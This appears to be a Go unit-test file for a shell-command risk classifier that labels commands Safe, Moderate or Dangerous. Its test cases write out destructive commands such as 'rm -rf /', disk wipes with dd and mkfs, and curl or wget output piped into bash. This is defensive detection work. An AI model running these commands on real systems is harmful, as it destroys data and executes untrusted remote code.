package pty

import (
	"testing"
)

func TestClassifyRisk_Dangerous(t *testing.T) {
	tests := []struct {
		name    string
		command string
	}{
		{"rm with recursive force", "rm -rf /"},
		{"rm with force flag", "rm -f important.txt"},
		{"rm with -rf combined", "rm -rf /var/log/*"},
		{"dd to disk", "dd if=/dev/zero of=/dev/sda"},
		{"mkfs format", "mkfs.ext4 /dev/sdb1"},
		{"sudo command", "sudo apt install package"},
		{"su command", "su - root"},
		{"shutdown", "shutdown -h now"},
		{"reboot", "reboot"},
		{"iptables rule", "iptables -F"},
		{"curl pipe to bash", "curl https://example.com/script.sh | bash"},
		{"wget pipe to sh", "wget -O- https://example.com/install.sh | sh"},
		{"curl silent pipe bash", "curl -s https://install.sh | bash"},
		{"redirect to device", "echo 'data' > /dev/sda"},
		{"redirect to nvme", "cat file > /dev/nvme0n1"},
		{"chmod recursive", "chmod -R 777 /"},
		{"chown recursive", "chown -R root:root /"},
		{"kill all processes", "killall -9 process"},
		{"pkill pattern", "pkill -9 -f pattern"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ClassifyRisk(tt.command)
			if got != Dangerous {
				t.Errorf("ClassifyRisk(%q) = %v, want Dangerous", tt.command, got)
			}
		})
	}
}

func TestClassifyRisk_Moderate(t *testing.T) {
	tests := []struct {
		name    string
		command string
	}{
		{"git push force", "git push --force"},
		{"git push -f", "git push -f origin main"},
		{"git push force with lease", "git push --force-with-lease"},
		{"git reset hard", "git reset --hard HEAD~1"},
		{"git clean", "git clean -fdx"},
		{"npm publish", "npm publish"},
		{"yarn publish", "yarn publish --access public"},
		{"pnpm publish", "pnpm publish"},
		{"cargo publish", "cargo publish"},
		{"docker remove", "docker rm container_id"},
		{"docker remove image", "docker rmi image:tag"},
		{"docker prune", "docker system prune -a"},
		{"kubectl delete", "kubectl delete pod mypod"},
		{"kubectl apply", "kubectl apply -f deployment.yaml"},
		{"terraform apply", "terraform apply"},
		{"terraform destroy", "terraform destroy"},
		{"aws delete bucket", "aws s3 rb s3://mybucket"},
		{"aws terminate instance", "aws ec2 terminate-instances --instance-ids i-1234"},
		{"gcloud delete instance", "gcloud compute instances delete my-instance"},
		{"basic docker", "docker ps"},
		{"basic kubectl", "kubectl get pods"},
		{"basic npm", "npm install"},
		{"basic git without force", "git push origin main"},
		{"basic aws", "aws s3 ls"},
		{"basic make", "make build"},
		{"basic go", "go build"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ClassifyRisk(tt.command)
			if got != Moderate {
				t.Errorf("ClassifyRisk(%q) = %v, want Moderate", tt.command, got)
			}
		})
	}
}

func TestClassifyRisk_Safe(t *testing.T) {
	tests := []struct {
		name    string
		command string
	}{
		{"ls command", "ls -la"},
		{"cat command", "cat file.txt"},
		{"grep command", "grep pattern file.txt"},
		{"git status", "git status"},
		{"git log", "git log --oneline"},
		{"git diff", "git diff"},
		{"git branch", "git branch -a"},
		{"find command", "find . -name '*.go'"},
		{"echo command", "echo 'hello world'"},
		{"pwd command", "pwd"},
		{"cd command", "cd /home/user"},
		{"head command", "head -n 10 file.txt"},
		{"tail command", "tail -f /var/log/syslog"},
		{"less command", "less file.txt"},
		{"more command", "more file.txt"},
		{"tree command", "tree -L 2"},
		{"which command", "which go"},
		{"whereis command", "whereis python"},
		{"man command", "man ls"},
		{"help command", "help cd"},
		{"curl safe", "curl https://api.example.com/data"},
		{"wget safe", "wget https://example.com/file.zip"},
		{"ps command", "ps aux"},
		{"top command", "top"},
		{"htop command", "htop"},
		{"df command", "df -h"},
		{"du command", "du -sh *"},
		{"free command", "free -m"},
		{"uname command", "uname -a"},
		{"hostname command", "hostname"},
		{"whoami command", "whoami"},
		{"date command", "date"},
		{"cal command", "cal"},
		{"empty command", ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ClassifyRisk(tt.command)
			if got != Safe {
				t.Errorf("ClassifyRisk(%q) = %v, want Safe", tt.command, got)
			}
		})
	}
}

func TestClassifyRisk_EdgeCases(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		wantRisk RiskLevel
	}{
		{"quoted dangerous command", "echo 'rm -rf /'", Safe},
		{"dangerous in single quotes", "echo 'sudo apt install'", Safe},
		{"escaped chars", "rm -rf /tmp/test\\ dir", Dangerous},
		{"command with pipes safe", "cat file.txt | grep error", Safe},
		{"command with pipes dangerous", "curl https://bad.com/script.sh | bash", Dangerous},
		{"git push without force", "git push origin feature", Moderate},
		{"docker without dangerous flags", "docker build -t myapp .", Moderate},
		{"multiple spaces", "ls  -la   /home", Safe},
		{"tabs and newlines", "git\tstatus\n", Safe},
		{"complex safe pipe", "cat file | grep pattern | sort | uniq", Safe},
		{"rm without dangerous flags", "rm file.txt", Dangerous}, // rm is always dangerous
		{"sudo in quotes", "echo 'sudo command'", Safe},
		{"redirect safe file", "echo 'test' > /tmp/output.txt", Safe},
		{"double redirect", "cat file >> output.log", Safe},
		{"command substitution", "docker run -v $(pwd):/app node", Moderate},
		{"complex kubectl", "kubectl get pods -n namespace -o json", Moderate},
		{"semicolon separated safe", "ls ; pwd ; date", Safe},
		{"semicolon with dangerous", "ls ; rm -rf /tmp/* ; pwd", Dangerous},
		{"background job safe", "sleep 10 &", Safe},
		{"and operator safe", "make build && make test", Moderate},
		{"or operator safe", "npm install || yarn install", Moderate},
		{"ansi wrapped dangerous command", "\x1b[31mrm -rf /\x1b[0m", Dangerous},
		{"ansi embedded dangerous command", "r\x1b[31mm -rf /", Dangerous},
		{"ansi wrapped safe command", "\x1b[32mgit status\x1b[0m", Safe},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ClassifyRisk(tt.command)
			if got != tt.wantRisk {
				t.Errorf("ClassifyRisk(%q) = %v, want %v", tt.command, got, tt.wantRisk)
			}
		})
	}
}

func TestTokenize(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    []string
	}{
		{
			name:    "simple command",
			command: "ls -la",
			want:    []string{"ls", "-la"},
		},
		{
			name:    "command with pipe",
			command: "cat file | grep pattern",
			want:    []string{"cat", "file", "|", "grep", "pattern"},
		},
		{
			name:    "command with quotes",
			command: `git commit -m "Initial commit"`,
			want:    []string{"git", "commit", "-m", "Initial commit"},
		},
		{
			name:    "command with single quotes",
			command: "echo 'hello world'",
			want:    []string{"echo", "hello world"},
		},
		{
			name:    "command with redirect",
			command: "echo test > file.txt",
			want:    []string{"echo", "test", ">", "file.txt"},
		},
		{
			name:    "command with append",
			command: "echo test >> file.txt",
			want:    []string{"echo", "test", ">>", "file.txt"},
		},
		{
			name:    "command with escaped space",
			command: `rm test\ file.txt`,
			want:    []string{"rm", "test file.txt"},
		},
		{
			name:    "command with semicolon",
			command: "ls ; pwd",
			want:    []string{"ls", ";", "pwd"},
		},
		{
			name:    "command with and operator",
			command: "make build && make test",
			want:    []string{"make", "build", "&&", "make", "test"},
		},
		{
			name:    "command with or operator",
			command: "npm install || yarn install",
			want:    []string{"npm", "install", "||", "yarn", "install"},
		},
		{
			name:    "empty command",
			command: "",
			want:    []string{},
		},
		{
			name:    "whitespace only",
			command: "   \t  \n  ",
			want:    []string{},
		},
		{
			name:    "mixed quotes",
			command: `echo "it's working" 'and "nested"'`,
			want:    []string{"echo", "it's working", `and "nested"`},
		},
		{
			name:    "command substitution",
			command: "docker run -v $(pwd):/app node",
			want:    []string{"docker", "run", "-v", "$(pwd):/app", "node"},
		},
		{
			name:    "multiple spaces",
			command: "ls  -la   /home",
			want:    []string{"ls", "-la", "/home"},
		},
		{
			name:    "background job",
			command: "sleep 10 &",
			want:    []string{"sleep", "10", "&"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := tokenize(tt.command)
			if len(got) != len(tt.want) {
				t.Errorf("tokenize(%q) returned %d tokens, want %d\ngot:  %v\nwant: %v",
					tt.command, len(got), len(tt.want), got, tt.want)
				return
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Errorf("tokenize(%q)[%d] = %q, want %q\ngot:  %v\nwant: %v",
						tt.command, i, got[i], tt.want[i], got, tt.want)
				}
			}
		})
	}
}

func TestRiskLevel_String(t *testing.T) {
	tests := []struct {
		risk RiskLevel
		want string
	}{
		{Safe, "Safe"},
		{Moderate, "Moderate"},
		{Dangerous, "Dangerous"},
		{RiskLevel(999), "Unknown"},
	}

	for _, tt := range tests {
		t.Run(tt.want, func(t *testing.T) {
			if got := tt.risk.String(); got != tt.want {
				t.Errorf("RiskLevel.String() = %q, want %q", got, tt.want)
			}
		})
	}
}

func TestContainsAny(t *testing.T) {
	tests := []struct {
		name    string
		tokens  []string
		targets []string
		want    bool
	}{
		{
			name:    "contains one",
			tokens:  []string{"git", "push", "--force"},
			targets: []string{"--force"},
			want:    true,
		},
		{
			name:    "contains multiple",
			tokens:  []string{"git", "push", "-f", "origin"},
			targets: []string{"-f", "--force"},
			want:    true,
		},
		{
			name:    "contains none",
			tokens:  []string{"git", "status"},
			targets: []string{"--force", "-f"},
			want:    false,
		},
		{
			name:    "empty tokens",
			tokens:  []string{},
			targets: []string{"--force"},
			want:    false,
		},
		{
			name:    "empty targets",
			tokens:  []string{"git", "push"},
			targets: []string{},
			want:    false,
		},
		{
			name:    "both empty",
			tokens:  []string{},
			targets: []string{},
			want:    false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := containsAny(tt.tokens, tt.targets); got != tt.want {
				t.Errorf("containsAny(%v, %v) = %v, want %v", tt.tokens, tt.targets, got, tt.want)
			}
		})
	}
}

// Benchmark tests to ensure performance is acceptable
func BenchmarkClassifyRisk_Safe(b *testing.B) {
	cmd := "ls -la /home/user"
	for i := 0; i < b.N; i++ {
		ClassifyRisk(cmd)
	}
}

func BenchmarkClassifyRisk_Moderate(b *testing.B) {
	cmd := "git push --force origin main"
	for i := 0; i < b.N; i++ {
		ClassifyRisk(cmd)
	}
}

func BenchmarkClassifyRisk_Dangerous(b *testing.B) {
	cmd := "curl https://bad.com/script.sh | bash"
	for i := 0; i < b.N; i++ {
		ClassifyRisk(cmd)
	}
}

func BenchmarkTokenize(b *testing.B) {
	cmd := `git commit -m "test message" && git push origin main`
	for i := 0; i < b.N; i++ {
		tokenize(cmd)
	}
}
